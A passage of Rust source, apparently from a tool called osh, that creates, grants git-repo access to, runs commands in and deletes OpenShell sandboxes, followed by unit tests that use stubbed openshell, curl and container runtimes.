    ensure_providers(ctx, &s.providers, dry_run)?;
    let images = images_for(&ctx.dir, &s.image);
    let driver = if s.share.is_some() {
        cli::gateway_driver()
    } else {
        String::new()
    };
    let plan = sandbox::plan_create(
        &s,
        &CreateCtx {
            dir: &ctx.dir,
            driver: &driver,
            images: &images,
            rebuild: false,
        },
    )?;
    let mut out = if dry_run {
        let steps: Vec<Value> = plan
            .steps
            .iter()
            .map(|st| json!({"prog": st.prog, "args": st.args}))
            .collect();
        Ok(json!({"name": s.name, "steps": steps}))
    } else {
        run_plan(
            &s.name,
            &plan.steps,
            grant.as_ref().map(|(r, v)| (r, v.as_str())),
            !s.command.is_empty(),
        )
    };
    // A sandbox that lives on gets git set up for its grant, as `sandbox_repo_grant` does.
    if let (Ok(v), Some((repo, _)), false) = (&mut out, &grant, dry_run || !s.command.is_empty()) {
        configure_git(ctx, &s.name, repo, v);
    }
    // The policy was written for this call alone; the gateway has read it by now.
    if let Some(p) = &plan.policy_file {
        let _ = std::fs::remove_file(p);
    }
    let share_note = join_notes(share_note, image_note);
    if let (Ok(v), Some(note)) = (&mut out, join_notes(share_note, plan.policy_note)) {
        v["note"] = Value::String(note);
    }
    out
}

/// Delete and untrack a repo provider this call made (best effort).
fn drop_made(provider: &str) {
    if cli::os(&["provider", "delete", provider]).is_ok() {
        ghrepo::untrack(ghrepo::tracked_path().as_deref(), &cli::gateway(), provider);
    }
}

/// Create the repo provider (when granted), then run the steps. When a step fails after the
/// provider was made, the provider is deleted and untracked again (best effort), so a retry
/// does not trip over it; one that could not be made is left alone. When the sandbox's own
/// provider (that exact name) is already on the gateway, left over from a sandbox deleted
/// outside osh, it is reused: its token is renewed and the plan attaches it. A reused provider
/// pre-dates this call, so a failed step leaves it be.
/// A `one_shot` create (`--no-keep`) has deleted its sandbox by the time it returns, so the
/// provider made for it is dropped the same way whether the command succeeded or not.
fn run_plan(
    name: &str,
    steps: &[sandbox::Step],
    grant: Option<(&ghrepo::GhRepo, &str)>,
    one_shot: bool,
) -> Result<Value, String> {
    let mut reused = false;
    let made = match grant {
        Some((repo, secret)) => {
            let provider = ghrepo::provider_name(name, repo);
            // A failed list is treated as "absent": the create then reports the real problem.
            let exists = cli::providers()
                .map(|l| l.iter().any(|p| p.name == provider))
                .unwrap_or(false);
            if exists {
                cli::renew_repo_token(repo, &provider, secret)?;
                reused = true;
            } else {
                cli::create_repo_provider(repo, &provider, secret)?;
            }
            Some(provider)
        }
        None => None,
    };
    for st in steps {
        // The plan's `openshell` args already carry the gateway, so `run`, not `exec`.
        if let Err(e) = cli::run(&st.prog, &st.args, &[]) {
            if let Some(p) = made.as_ref().filter(|_| !reused) {
                drop_made(p);
            }
            return Err(format!("{}: {e}", st.label()));
        }
    }
    if one_shot {
        if let Some(p) = &made {
            drop_made(p);
        }
    }
    let phase = cli::sandboxes()
        .ok()
        .and_then(|l| l.into_iter().find(|x| x.name == name))
        .map(|x| x.phase)
        .unwrap_or_default();
    Ok(json!({"name": name, "phase": phase}))
}

/// How access is really cut, for the user: the stored copy is not the grant.
fn cut_access_steps(repo: &ghrepo::GhRepo, var: &str) -> String {
    format!(
        "Removing the stored token does NOT revoke access: when a grant is made, the OpenShell gateway keeps its own copy in a provider attached to the sandbox, and the token stays valid on the forge until it expires or is deleted there. To cut access fully: 1) call sandbox_repo_revoke (or delete the sandbox), which detaches and deletes the provider; 2) the user deletes the token at {page}; 3) the user runs `osh mcp secret remove {var}`.",
        page = ghrepo::tokens_page(repo),
    )
}

/// What to tell the agent when it asks for a repo grant the user has not prepared: the page that
/// creates the token, the steps there, the one command the user runs in a terminal of their own,
/// and how to take it away again. Written for the user to read out of the agent's answer.
fn token_guidance(
    repo: &ghrepo::GhRepo,
    var: &str,
    why: &str,
    sandbox: &str,
    running: bool,
) -> String {
    // A name that says nothing (`GITHUB_TOKEN`) is replaced by one for this repo, so the user can
    // tell their stored tokens apart; any name they prefer works if they tell the agent.
    let generic = is_generic_var(var);
    let suggested = ghrepo::suggested_var(repo);
    let name = if crate::secrets::valid_name(var) && !generic {
        var
    } else {
        suggested.as_str()
    };
    format!(
        "Access to {repo} needs a token that only the user can create ({why}). Tell the user, in this order:\n\
         A. {steps}\n\
         B. When they have it, in a terminal of their own (outside this chat) they run `osh mcp secret set {name}`; it asks for the token with a hidden prompt, so it never appears in this session or in their shell history. {name} is only a suggestion: any name that suits the user works, as long as you then use that same name as env_var.\n\
         C. {then}\n\
         D. {cut}",
        then = if running {
            format!("They tell you it is done, and you call this tool again with env_var \"{name}\". No sandbox restart or recreation is needed: the grant is added to the running sandbox.")
        } else {
            format!("They tell you it is done, and you create the sandbox again with env_var \"{name}\"; for a sandbox that already exists, call sandbox_repo_grant instead, which adds the access to the running sandbox with no recreation.")
        },
        cut = cut_access_steps(repo, name),
        repo = repo.shown(),
        steps = ghrepo::steps_for(repo, &ghrepo::token_url(repo, sandbox), sandbox).replace('\n', "\n   "),
    )
}

/// Give the running sandbox `name` access to one git repo: create (or refresh) the repo provider
/// from the token the operator stored under `env_var` (or the server's allowed variable), attach
/// it to the sandbox and, for GitHub, point the sandbox's git at it. The sandbox is neither
/// stopped nor recreated. Without a usable token the answer is an error that says what the user
/// has to do (`token_guidance`).
pub fn repo_grant(ctx: &Ctx, name: &str, url: &str, env_var: &str) -> Result<Value, String> {
    check_name(name)?;
    target(ctx)?;
    let repo = sandbox::grant_repo(url)?;
    let credential = check_repo_var(ctx, env_var)
        .and_then(|_| repo_secret(ctx, env_var))
        .map_err(|why| token_guidance(&repo, env_var, &why, name, true))?;
    if !sandbox_exists(ctx, name)? {
        return Err(format!("no sandbox named {name}"));
    }
    let provider = ghrepo::provider_name(name, &repo);
    let existed = cli::os(&["provider", "get", &provider]).is_ok();
    if existed {
        cli::renew_repo_token(&repo, &provider, &credential)?;
    } else {
        cli::create_repo_provider(&repo, &provider, &credential)?;
    }
    if !cli::attached_providers(name).contains(&provider) {
        let attached = cli::os(&[
            "sandbox",
            "provider",
            "attach",
            name,
            &provider,
            "--wait",
            "--timeout",
            "30",
        ]);
        if let Err(e) = attached {
            if !existed {
                drop_made(&provider);
            }
            return Err(format!("attaching {provider} to {name}: {e}"));
        }
    }
    let mut out = json!({
        "name": name, "provider": provider, "repo": repo.shown(), "attached": true,
        "to_remove": cut_access_steps(&repo, env_var),
    });
    configure_git(ctx, name, &repo, &mut out);
    Ok(out)
}

/// Make `git` in the sandbox use the repo's provider token (credential helper, and `git@`/`ssh`
/// remotes rewritten to https, since the providers only reach port 443). Without this a push
/// from the sandbox fails and an agent is tempted to push from the host instead. Records
/// `git_configured` and, when it did not work, a note, in `out`.
fn configure_git(ctx: &Ctx, name: &str, repo: &ghrepo::GhRepo, out: &mut Value) {
    if repo.is_github() {
        let argv: Vec<String> = ["sh", "-c", ghrepo::GITHUB_GIT_CONFIG]
            .map(String::from)
            .to_vec();
        let ok = run_in_sandbox(ctx, name, &argv, 60, true).is_ok_and(|(code, _, _)| code == 0);
        out["git_configured"] = json!(ok);
        if !ok {
            out["note"] = json!("the grant is attached, but git in the sandbox could not be configured for it; run git with the credential helper by hand");
        }
    } else {
        out["note"] = json!("attached; git in the sandbox is not configured for this host: it needs the provider's token as a Basic credential (see the dashboard's shell)");
    }
}

/// Take the repo grant away from a sandbox: detach its provider and delete it. The stored token
/// (`osh mcp secret remove`) and the token on the forge are the user's to remove.
pub fn repo_revoke(ctx: &Ctx, name: &str, url: &str) -> Result<Value, String> {
    check_name(name)?;
    target(ctx)?;
    let repo = sandbox::grant_repo(url)?;
    let provider = ghrepo::provider_name(name, &repo);
    let was_attached = cli::attached_providers(name).contains(&provider);
    if was_attached {
        cli::os(&[
            "sandbox",
            "provider",
            "detach",
            name,
            &provider,
            "--wait",
            "--timeout",
            "30",
        ])?;
    }
    let existed = cli::os(&["provider", "get", &provider]).is_ok();
    if existed {
        cli::os(&["provider", "delete", &provider])?;
        ghrepo::untrack(
            ghrepo::tracked_path().as_deref(),
            &cli::gateway(),
            &provider,
        );
    }
    Ok(json!({
        "name": name, "provider": provider, "detached": was_attached, "deleted": existed,
        "next": format!(
            "The sandbox no longer has the grant. The token itself is still valid: the user deletes it at {}, then runs `osh mcp secret remove NAME` to forget the stored copy.",
            ghrepo::tokens_page(&repo)
        ),
    }))
}

/// Delete a sandbox and, as the dashboard does, the per-sandbox repo providers osh made for it.
/// A sandbox that is no longer listed (a one-shot create deletes its own) is not an error: its
/// repo providers are still dropped and the answer says `already_gone`. When the list cannot be
/// read, the delete is tried as usual.
pub fn sandbox_delete(ctx: &Ctx, name: &str) -> Result<Value, String> {
    check_name(name)?;
    target(ctx)?;
    let listed = cli::sandboxes().map_or(true, |l| l.iter().any(|x| x.name == name));
    let providers = cli::providers().unwrap_or_default();
    if !listed {
        cli::drop_repo_providers(name, &providers);
        return Ok(json!({"name": name, "deleted": false, "already_gone": true}));
    }
    cli::os(&["sandbox", "delete", name])?;
    cli::drop_repo_providers(name, &providers);
    Ok(json!({"name": name, "deleted": true}))
}

/// Run `argv` in a sandbox with `openshell sandbox exec`, giving up after `timeout_secs`. The
/// command's exit code (a signal as 128 + its number) and both streams come back as they are;
/// only failing to run `openshell` is `Err`.
pub(crate) fn run_in_sandbox(
    ctx: &Ctx,
    name: &str,
    argv: &[String],
    timeout_secs: u64,
    no_login_shell: bool,
) -> Result<(i32, Vec<u8>, Vec<u8>), String> {
    check_name(name)?;
    if argv.is_empty() {
        return Err("no command to run".into());
    }
    sandbox::check_exec_argv(argv)?;
    target(ctx)?;
    let mut args: Vec<String> = ["sandbox", "exec", "-n", name, "--timeout"]
        .map(String::from)
        .to_vec();
    args.push(timeout_secs.to_string());
    if no_login_shell {
        args.push("--no-login-shell".into());
    }
    args.push("--".into());
    args.extend(argv.iter().cloned());
    // Not `cli::exec`: it turns a non-zero exit into `Err` and drops the code, while the
    // command's own exit code and both streams are the answer here.
    let mut cmd = Command::new("openshell");
    cmd.args(cli::with_gateway(args));
    // `--timeout` times the command, not the connection to a gateway that has stopped answering.
    let out = output_within(
        cmd,
        std::time::Duration::from_secs(timeout_secs.saturating_add(15)),
    )?;
    let code = out
        .status
        .code()
        .or_else(|| out.status.signal().map(|s| 128 + s))
        .unwrap_or(-1);
    Ok((code, out.stdout, out.stderr))
}

/// Run a prepared `openshell` command and wait at most `limit` for it, then kill it. Output is
/// read as it comes, so a command that writes a lot cannot stall on a full pipe.
pub(crate) fn output_within(
    mut cmd: Command,
    limit: std::time::Duration,
) -> Result<std::process::Output, String> {
    use std::io::Read;
    cmd.stdin(Stdio::null())
        .stdout(Stdio::piped())
        .stderr(Stdio::piped());
    let mut child = cmd.spawn().map_err(|e| format!("openshell: {e}"))?;
    fn slurp<R: Read>(pipe: Option<R>) -> Vec<u8> {
        let mut v = Vec::new();
        if let Some(mut p) = pipe {
            let _ = p.read_to_end(&mut v);
        }
        v
    }
    let (so, se) = (child.stdout.take(), child.stderr.take());
    let t_out = std::thread::spawn(move || slurp(so));
    let t_err = std::thread::spawn(move || slurp(se));
    let end = std::time::Instant::now() + limit;
    loop {
        match child.try_wait() {
            Ok(Some(status)) => {
                return Ok(std::process::Output {
                    status,
                    stdout: t_out.join().unwrap_or_default(),
                    stderr: t_err.join().unwrap_or_default(),
                })
            }
            Ok(None) if std::time::Instant::now() >= end => {
                let _ = child.kill();
                let _ = child.wait();
                return Err(format!("openshell did not answer within {limit:?}"));
            }
            Ok(None) => std::thread::sleep(std::time::Duration::from_millis(20)),
            Err(e) => return Err(format!("openshell: {e}")),
        }
    }
}

/// Whether the gateway the context aims at lists a sandbox of this name. `Err` when the list
/// could not be had: not knowing is not "gone".
pub(crate) fn sandbox_exists(ctx: &Ctx, name: &str) -> Result<bool, String> {
    target(ctx)?;
    let mut cmd = Command::new("openshell");
    cmd.args(cli::with_gateway(
        ["sandbox", "list", "--output", "json"]
            .map(String::from)
            .to_vec(),
    ));
    let out = output_within(cmd, std::time::Duration::from_secs(30))?;
    if !out.status.success() {
        return Err(String::from_utf8_lossy(&out.stderr).trim().to_string());
    }
    let v: Value = serde_json::from_slice(&out.stdout).map_err(|e| e.to_string())?;
    Ok(cli::parse_sandboxes(&v).iter().any(|s| s.name == name))
}

/// The name of the gateway the OpenShell CLI uses by default, when it names one.
pub(crate) fn active_gateway() -> Result<Option<String>, String> {
    let mut cmd = Command::new("openshell");
    cmd.args(["gateway", "list", "-o", "json"]);
    let out = output_within(cmd, std::time::Duration::from_secs(30))?;
    if !out.status.success() {
        return Err(String::from_utf8_lossy(&out.stderr).trim().to_string());
    }
    let v: Value = serde_json::from_slice(&out.stdout).map_err(|e| e.to_string())?;
    Ok(cli::parse_gateways(&v)
        .into_iter()
        .find(|g| g.active)
        .map(|g| g.name))
}

/// Run `argv` in a sandbox. The command's own exit code, non-zero included, is `Ok`; only
/// failing to run `openshell` is `Err`.
pub fn sandbox_exec(ctx: &Ctx, name: &str, argv: &[String]) -> Result<Value, String> {
    let (code, stdout, stderr) = run_in_sandbox(ctx, name, argv, 600, false)?;
    Ok(json!({
        "exit_code": code,
        "stdout": String::from_utf8_lossy(&stdout),
        "stderr": String::from_utf8_lossy(&stderr),
    }))
}

/// Create the sandbox unless one of that name exists; an existing one is left as it is. A
/// `note` from the create (risky share, policy) is passed on.
pub fn apply(ctx: &Ctx, spec: &Value) -> Result<Value, String> {
    apply_in(ctx, spec, &home())
}

fn apply_in(ctx: &Ctx, spec: &Value, home: &str) -> Result<Value, String> {
    let s = checked_spec(ctx, spec, home)?.spec;
    target(ctx)?;
    if cli::sandboxes()?.iter().any(|x| x.name == s.name) {
        return Ok(json!({"action": "unchanged", "name": s.name}));
    }
    let made = create_in(ctx, spec, false, home)?;
    let mut out = json!({"action": "created", "name": s.name});
    if let Some(n) = made.get("note") {
        out["note"] = n.clone();
    }
    Ok(out)
}

/// The output contract: `Ok(v)` prints `v` and exits 0; `Err(e)` prints
/// `{"ok":false,"error":e}` and exits 1.
pub fn envelope(r: Result<Value, String>) -> (Value, i32) {
    match r {
        Ok(v) => (v, 0),
        Err(e) => (json!({"ok": false, "error": e}), 1),
    }
}

#[cfg(test)]
pub(crate) mod tests {
    use super::*;
    use crate::ghrepo;
    use serde_json::json;
    use std::ffi::OsString;
    use std::os::unix::fs::PermissionsExt;
    use std::path::Path;
    use std::sync::{Mutex, MutexGuard};

    /// Tests here change PATH and process-wide variables, so they run one at a time.
    static ENV: Mutex<()> = Mutex::new(());

    const FAKE_VARS: &[&str] = &[
        "OSH_FAKE_SANDBOXES",
        "OSH_FAKE_PROVIDERS",
        "OSH_FAKE_GATEWAYS",
        "OSH_FAKE_GATEWAY_INFO",
        "OSH_FAKE_FAIL",
        "OSH_FAKE_FAIL_ONCE",
        "OSH_FAKE_EXEC_EXIT",
        "OSH_FAKE_EXEC_STDOUT",
        "OSH_FAKE_EXEC_STDERR",
        "OSH_FAKE_ENV_KEYS",
        "OSH_FAKE_EXEC_RUN",
    ];

    /// The stand-in `openshell` (and a failing `curl`, so a repo grant never reaches the
    /// network) first on PATH, a seeded data dir, and the call log.
    pub(crate) struct Fake {
        pub(crate) dir: PathBuf,
        pub(crate) log: PathBuf,
        path: Option<OsString>,
        _lock: MutexGuard<'static, ()>,
    }

    impl Fake {
        pub(crate) fn new(tag: &str) -> Fake {
            let lock = ENV.lock().unwrap_or_else(|e| e.into_inner());
            let root =
                std::env::temp_dir().join(format!("osh-core-ops-{tag}-{}", std::process::id()));
            let _ = std::fs::remove_dir_all(&root);
            let bin = root.join("bin");
            let dir = root.join("data");
            std::fs::create_dir_all(&bin).unwrap();
            std::fs::create_dir_all(&dir).unwrap();
            for f in ["sandbox-policy.yaml", "toolchains.toml"] {
                std::fs::write(dir.join(f), crate::assets::embedded(f).unwrap()).unwrap();
            }
            let script = Path::new(env!("CARGO_MANIFEST_DIR")).join("tests/fake-openshell.sh");
            let fake = bin.join("openshell");
            std::fs::copy(&script, &fake).unwrap();
            std::fs::set_permissions(&fake, std::fs::Permissions::from_mode(0o755)).unwrap();
            let curl = bin.join("curl");
            std::fs::write(&curl, "#!/bin/sh\nexit 7\n").unwrap();
            std::fs::set_permissions(&curl, std::fs::Permissions::from_mode(0o755)).unwrap();
            // The container runtime is faked too: a test that builds an image must never reach the
            // user's Docker. `image inspect` says "not built" (and names the user `node` when asked its config); everything else succeeds and is
            // logged to runtime.log.
            let runtime_log = root.join("runtime.log");
            for rt in ["docker", "podman"] {
                let stub = bin.join(rt);
                std::fs::write(
                    &stub,
                    format!(
                        "#!/bin/sh\necho \"$@\" >> '{}'\nif [ \"$1\" = run ] && echo \"$@\" | grep -q FAILME; then echo 'sh: FAILME: not found' >&2; exit 127; fi\nif [ \"$1 $2\" = \"build --check\" ]; then if grep -q '^FORM' \"$3/Dockerfile\"; then echo 'ERROR: dockerfile parse error on line 2: unknown instruction: FORM' >&2; exit 1; fi; if grep -q LINTME \"$3/Dockerfile\"; then printf 'WARNING: StubRule - https://example.test/rule\\nlint me\\nDockerfile:1\\n' >&2; fi; exit 0; fi\nif [ \"$1 $2\" = \"image inspect\" ]; then [ \"$3\" = \"--format\" ] && echo node && exit 0; case \"$3\" in *built*) exit 0;; esac; exit 1; fi\nif [ \"$1 $2\" = \"image rm\" ]; then case \"$3\" in *inuse*) echo 'conflict: image is being used by container abc' >&2; exit 1;; esac; fi\nexit 0\n",
                        runtime_log.display()
                    ),
                )
                .unwrap();
                std::fs::set_permissions(&stub, std::fs::Permissions::from_mode(0o755)).unwrap();
            }
            let log = root.join("calls.log");
            std::fs::write(&log, "").unwrap();
            let path = std::env::var_os("PATH");
            let mut dirs = vec![bin];
            dirs.extend(std::env::split_paths(path.as_deref().unwrap_or_default()));
            std::env::set_var("PATH", std::env::join_paths(dirs).unwrap());
            std::env::set_var("OSH_FAKE_LOG", &log);
            std::env::set_var("OSH_JOBS_SANDBOX_DIR", root.join("jobs"));
            // Defence in depth: a test that ever runs `git config --global` for real writes to
            // this scratch file, never to the user's own configuration.
            std::env::set_var("GIT_CONFIG_GLOBAL", root.join("scratch-gitconfig"));
            std::env::set_var("GIT_CONFIG_SYSTEM", "/dev/null");
            for v in FAKE_VARS {
                std::env::remove_var(v);
            }
            // The gateway has the `npm` provider the shared test spec names.
            std::env::set_var(
                "OSH_FAKE_PROVIDERS",
                r#"{"providers":[{"name":"npm","type":"npm","credential_keys":[]}]}"#,
            );
            crate::cli::set_gateway("");
            Fake {
                dir,
                log,
                path,
                _lock: lock,
            }
        }

        pub(crate) fn ctx(&self) -> Ctx {
            Ctx {
                dir: self.dir.clone(),
                gateway: None,
                allow_share: false,
                refuse_risky_share: false,
                repo_vars: None,
                share_roots: None,
                version: "0.0.0-test".into(),
                job_max_secs: 0,
            }
        }

        /// What the faked container runtime was asked.
        pub(crate) fn runtime_calls(&self) -> String {
            std::fs::read_to_string(self.dir.parent().unwrap().join("runtime.log"))
                .unwrap_or_default()
        }

        pub(crate) fn calls(&self) -> String {
            std::fs::read_to_string(&self.log).unwrap()
        }
    }

    impl Drop for Fake {
        fn drop(&mut self) {
            match &self.path {
                Some(p) => std::env::set_var("PATH", p),
                None => std::env::remove_var("PATH"),
            }
            std::env::remove_var("OSH_FAKE_LOG");
            for v in FAKE_VARS {
                std::env::remove_var(v);
            }
            crate::cli::set_gateway("");
        }
    }

    fn spec() -> Value {
        json!({"name":"w1","image":"img:1","providers":["npm"],"cpu":"2","memory":"4Gi"})
    }

    #[test]
    fn create_requires_valid_name() {
        let f = Fake::new("name");
        for bad in [json!({}), json!({"name":""}), json!({"name":"../x"})] {
            let e = sandbox_create(&f.ctx(), &bad, false).unwrap_err();
            assert!(e.contains("name"), "{e}");
        }
        assert_eq!(f.calls(), "");
    }

    #[test]
    fn create_rejects_bad_spec_without_calls() {
        let f = Fake::new("badspec");
        let e = sandbox_create(&f.ctx(), &json!({"name":"w1","cpus":2}), false).unwrap_err();
        assert!(e.contains("cpus"), "{e}");
        assert_eq!(f.calls(), "");
    }

    #[test]
    fn create_dry_run_does_not_call_openshell_write() {
        let f = Fake::new("dry");
        let v = sandbox_create(&f.ctx(), &spec(), true).unwrap();
        assert_eq!(v["name"], "w1");
        let steps = v["steps"].as_array().unwrap();
        let last = steps.last().unwrap();
        assert_eq!(last["prog"], "openshell");
        let args: Vec<&str> = last["args"]
            .as_array()
            .unwrap()
            .iter()
            .map(|a| a.as_str().unwrap())
            .collect();
        assert_eq!(&args[..2], ["sandbox", "create"]);
        assert!(args.contains(&"--detach"), "{args:?}");
        let calls = f.calls();
        assert!(!calls.contains("create"), "{calls}");
        assert!(!calls.contains("delete"), "{calls}");
    }

    #[test]
    fn create_runs_plan_steps_in_order() {
        let f = Fake::new("run");
        let v = sandbox_create(&f.ctx(), &spec(), false).unwrap();
        assert_eq!(v["name"], "w1");
        assert!(v.get("phase").is_some(), "{v}");
        let calls = f.calls();
        let line = calls
            .lines()
            .find(|l| l.starts_with("sandbox create"))
            .unwrap_or_else(|| panic!("{calls}"));
        let prefix = format!("sandbox create --policy {}/", f.dir.display());
        let tail = " --name w1 --from img:1 --cpu 2 --memory 4Gi --provider npm --detach";
        assert!(line.starts_with(&prefix) && line.ends_with(tail), "{line}");
        let policy = &line[prefix.len() - 1..line.len() - tail.len()];
        assert!(!policy.contains(' '), "{policy}");
        assert_ne!(
            policy,
            format!("/{}", ".sandbox-policy.generated.yaml"),
            "{line}"
        );
    }

    /// The `--policy` path of the `sandbox create` line in `calls`.
    fn policy_arg(calls: &str) -> PathBuf {
        let line = calls
            .lines()
            .find(|l| l.starts_with("sandbox create"))
            .unwrap_or_else(|| panic!("{calls}"));
        let mut it = line.split(' ').skip_while(|w| *w != "--policy");
        PathBuf::from(it.nth(1).unwrap())
    }

    #[test]
    fn the_per_call_policy_is_removed_after_the_create() {
        let f = Fake::new("policy-rm");
        sandbox_create(&f.ctx(), &spec(), false).unwrap();
        let p = policy_arg(&f.calls());
        assert!(p.starts_with(&f.dir), "{p:?}");
        assert!(!p.exists(), "{p:?}");
        // And after a failed create too.
        std::fs::write(&f.log, "").unwrap();
        std::env::set_var("OSH_FAKE_FAIL", "sandbox create");
        sandbox_create(&f.ctx(), &spec(), false).unwrap_err();
        let p = policy_arg(&f.calls());
        assert!(!p.exists(), "{p:?}");
        assert!(f.dir.join("sandbox-policy.yaml").is_file());
    }

    #[test]
    fn a_policy_note_is_returned_as_note() {
        let f = Fake::new("note");
        std::fs::write(f.dir.join("toolchains.toml"), "not [valid").unwrap();
        for dry in [true, false] {
            let v = sandbox_create(&f.ctx(), &spec(), dry).unwrap();
            let note = v["note"].as_str().unwrap_or_else(|| panic!("{v}"));
            assert!(note.contains("toolchains.toml"), "{note}");
        }
        std::fs::write(
            f.dir.join("toolchains.toml"),
            crate::assets::embedded("toolchains.toml").unwrap(),
        )
        .unwrap();
        let v = sandbox_create(&f.ctx(), &spec(), true).unwrap();
        assert!(v.get("note").is_none(), "{v}");
    }

    #[test]
    fn a_gateway_that_looks_like_a_flag_is_refused() {
        let f = Fake::new("gw-flag");
        let ctx = Ctx {
            gateway: Some("--help".into()),
            ..f.ctx()
        };
        let e = sandbox_create(&ctx, &spec(), false).unwrap_err();
        assert!(e.contains("gateway"), "{e}");
        assert!(sandbox_list(&ctx).is_err());
        assert!(sandbox_delete(&ctx, "w1").is_err());
        assert!(sandbox_exec(&ctx, "w1", &["ls".into()]).is_err());
        assert!(apply(&ctx, &spec()).is_err());
        assert_eq!(f.calls(), "");
    }

    #[test]
    fn a_failed_create_deletes_the_repo_provider_it_made() {
        let f = Fake::new("repo-cleanup");
        std::env::set_var("OSH_TEST_TOK", secret_value());
        std::env::set_var("OSH_FAKE_FAIL", "sandbox create");
        let r = sandbox_create(&f.ctx(), &with_repo("OSH_TEST_TOK"), false);
        std::env::remove_var("OSH_TEST_TOK");
        let e = r.unwrap_err();
        assert!(e.contains("fake failure"), "{e}");
        let calls = f.calls();
        let lines: Vec<&str> = calls.lines().collect();
        let made = lines
            .iter()
            .position(|l| l.starts_with("provider create --name github-w1-r"))
            .unwrap_or_else(|| panic!("{calls}"));
        let failed = lines
            .iter()
            .position(|l| l.starts_with("sandbox create"))
            .unwrap();
        let gone = lines
            .iter()
            .position(|l| *l == "provider delete github-w1-r")
            .unwrap_or_else(|| panic!("{calls}"));
        assert!(made < failed && failed < gone, "{calls}");
    }

    #[test]
    fn an_existing_sandbox_provider_is_renewed_and_attached_not_created() {
        let f = Fake::new("repo-reuse");
        std::env::set_var("OSH_TEST_TOK", secret_value());
        std::env::set_var(
            "OSH_FAKE_PROVIDERS",
            r#"{"providers":[{"name":"npm","type":"npm","credential_keys":[]},{"name":"github-w1-r","type":"x","credential_keys":[]}]}"#,
        );
        let r = sandbox_create(&f.ctx(), &with_repo("OSH_TEST_TOK"), false);
        std::env::remove_var("OSH_TEST_TOK");
        r.unwrap();
        let calls = f.calls();
        assert!(!calls.contains("provider create"), "{calls}");
        assert!(calls.contains("provider update github-w1-r"), "{calls}");
        let lines: Vec<&str> = calls.lines().collect();
        let upd = lines
            .iter()
            .position(|l| l.starts_with("provider update github-w1-r"))
            .unwrap();
        let sb = lines
            .iter()
            .position(|l| l.starts_with("sandbox create"))
            .unwrap_or_else(|| panic!("{calls}"));
        assert!(upd < sb, "{calls}");
        assert!(lines[sb].contains("--provider github-w1-r"), "{calls}");
        assert!(!calls.contains(&secret_value()), "{calls}");
    }

    #[test]
    fn a_reused_provider_survives_a_failed_create() {
        let f = Fake::new("repo-reuse-fail");
        std::env::set_var("OSH_TEST_TOK", secret_value());
        std::env::set_var(
            "OSH_FAKE_PROVIDERS",
            r#"{"providers":[{"name":"github-w1-r","type":"x","credential_keys":[]}]}"#,
        );
        std::env::set_var("OSH_FAKE_FAIL", "sandbox create");
        let r = sandbox_create(&f.ctx(), &with_repo("OSH_TEST_TOK"), false);
        std::env::remove_var("OSH_TEST_TOK");
        assert!(r.is_err());
        assert!(!f.calls().contains("provider delete"), "{}", f.calls());
    }

    #[test]
    fn a_provider_that_could_not_be_made_is_not_deleted() {
        let f = Fake::new("repo-exists");
        std::env::set_var("OSH_TEST_TOK", secret_value());
        std::env::set_var("OSH_FAKE_FAIL", "provider create");
        let r = sandbox_create(&f.ctx(), &with_repo("OSH_TEST_TOK"), false);
        std::env::remove_var("OSH_TEST_TOK");
        assert!(r.is_err());
        let calls = f.calls();
        assert!(!calls.contains("provider delete"), "{calls}");
        assert!(!calls.contains("sandbox create"), "{calls}");
    }

    #[test]
    fn create_reports_phase_from_the_listing() {
        let f = Fake::new("phase");
        std::env::set_var(
            "OSH_FAKE_SANDBOXES",
            r#"{"sandboxes":[{"name":"w1","phase":"Ready","created_at":"t"}]}"#,
        );
        let v = sandbox_create(&f.ctx(), &spec(), false).unwrap();
        assert_eq!(v, json!({"name":"w1","phase":"Ready"}));
    }

    #[test]
    fn create_failure_is_err() {
        let f = Fake::new("fail");
        std::env::set_var("OSH_FAKE_FAIL", "sandbox create");
        let e = sandbox_create(&f.ctx(), &spec(), false).unwrap_err();
        assert!(e.contains("fake failure"), "{e}");
    }

    #[test]
    fn gateway_from_ctx_targets_every_call() {
        let f = Fake::new("gw");
        let ctx = Ctx {
            gateway: Some("gw1".into()),
            ..f.ctx()
        };
        sandbox_create(&ctx, &spec(), false).unwrap();
        let calls = f.calls();
        assert!(!calls.is_empty());
        assert!(calls.lines().all(|l| l.starts_with("-g gw1 ")), "{calls}");
        assert!(!calls.contains("-g gw1 -g"), "{calls}");
    }

    fn with_share(path: &Path) -> Value {
        let mut s = spec();
        s["share"] = json!({"path": path.to_string_lossy(), "rw": false});
        s
    }

    #[test]
    fn share_rejected_unless_allowed() {
        let f = Fake::new("share-no");
        let e = sandbox_create(&f.ctx(), &with_share(&f.dir), false).unwrap_err();
        assert!(e.contains("share"), "{e}");
        assert_eq!(f.calls(), "");
    }

    #[test]
    fn share_allowed_with_flag() {
        let f = Fake::new("share-yes");
        let ctx = Ctx {
            allow_share: true,
            ..f.ctx()
        };
        sandbox_create(&ctx, &with_share(&f.dir), false).unwrap();
        let calls = f.calls();
        assert!(calls.contains("gateway info"), "{calls}");
        let create = calls
            .lines()
            .find(|l| l.starts_with("sandbox create"))
            .unwrap();
        assert!(
            create.contains("--driver-config-json {\"docker\":"),
            "{create}"
        );
        assert!(create.contains("\"target\":\"/sandbox/data\""), "{create}");
    }

    #[test]
    fn share_path_must_be_an_existing_absolute_dir() {
        let f = Fake::new("share-path");
        let ctx = Ctx {
            allow_share: true,
            ..f.ctx()
        };
        let file = f.dir.join("sandbox-policy.yaml");
        let missing = f.dir.join("nope");
        for bad in [Path::new("rel/dir"), Path::new(""), &missing, &file] {
            let e = sandbox_create(&ctx, &with_share(bad), false).unwrap_err();
            assert!(e.contains("share.path"), "{bad:?}: {e}");
        }
        assert_eq!(f.calls(), "");
    }

    #[test]
    fn share_on_unknown_driver_is_err() {
        let f = Fake::new("share-drv");
        std::env::set_var("OSH_FAKE_GATEWAY_INFO", "{}");
        let ctx = Ctx {
            allow_share: true,
            ..f.ctx()
        };
        let e = sandbox_create(&ctx, &with_share(&f.dir), false).unwrap_err();
        assert!(e.contains("driver"), "{e}");
        assert!(!f.calls().contains("sandbox create"));
    }

    fn with_repo(var: &str) -> Value {
        let mut s = spec();
        s["repo"] = json!({"url": "https://github.com/o/r", "env_var": var});
        s
    }

    fn secret_value() -> String {
        format!("tok-{}", "x".repeat(24))
    }

    #[test]
    fn env_var_unset_is_error_and_value_never_leaks() {
        let f = Fake::new("repo-unset");
        std::env::remove_var("OSH_TEST_UNSET");
        let e = sandbox_create(&f.ctx(), &with_repo("OSH_TEST_UNSET"), false).unwrap_err();
        assert!(e.contains("OSH_TEST_UNSET"), "{e}");
